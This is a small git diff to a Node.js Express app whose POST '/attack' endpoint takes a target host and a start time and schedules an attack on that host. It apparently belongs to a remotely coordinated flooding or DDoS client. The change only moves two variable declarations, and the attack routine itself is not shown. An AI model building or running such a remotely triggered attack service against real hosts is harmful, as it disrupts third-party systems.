@@ -6,7 +6,11 @@ var Req = require('request');
 var app = express();
 
 var id;
-var im = {}
+var im = {};
+
+var s=0;
+var n = 5;
+
 im.success = 0;
 const lto = 'https://bb-s.herokuapp.com';
 
@@ -31,8 +35,7 @@ app.post('/attack',function (req,res) {
   var time = req.body.time - getNow();
   var host = req.body.host;
   id = req.body.id;
-  var s=0;
-  var n = 5;
+
 
   setTimeout(function () {
     attack(host);
